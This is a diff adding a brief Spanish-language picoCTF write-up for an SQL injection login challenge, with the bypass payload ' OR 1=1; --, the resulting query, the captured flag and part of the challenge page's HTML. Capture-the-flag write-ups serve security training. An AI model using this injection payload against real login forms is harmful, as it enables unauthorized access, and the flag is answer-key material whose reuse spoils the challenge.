@@ -1,0 +1,19 @@
+en este se necesita burpsuite y luego cuando iniciamos sesion en la pagina interceptamos la respuesta y luego cambiamos la contraseña a ' OR 1=1; -- y con eso obtenemos lo siguiente 
+<pre>username: a
+password: ' OR 1=1; --
+SQL query: SELECT id FROM users WHERE password = '' OR 1=1; --' AND username = 'a'
+</pre><h1>Logged in!.</h1><p>Your flag is: picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8b7cc2a}</p>
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<title>picoCTF SQLi Security Challenge</title>
+		<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+		<link rel="stylesheet" type="text/css" href="css/style.css">
+		<!-- Bootstrap -->
+		<link href="css/bootstrap.min.css" rel="stylesheet">
+		<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+		<script src="js/bootstrap.min.js"></script>
+	</head>
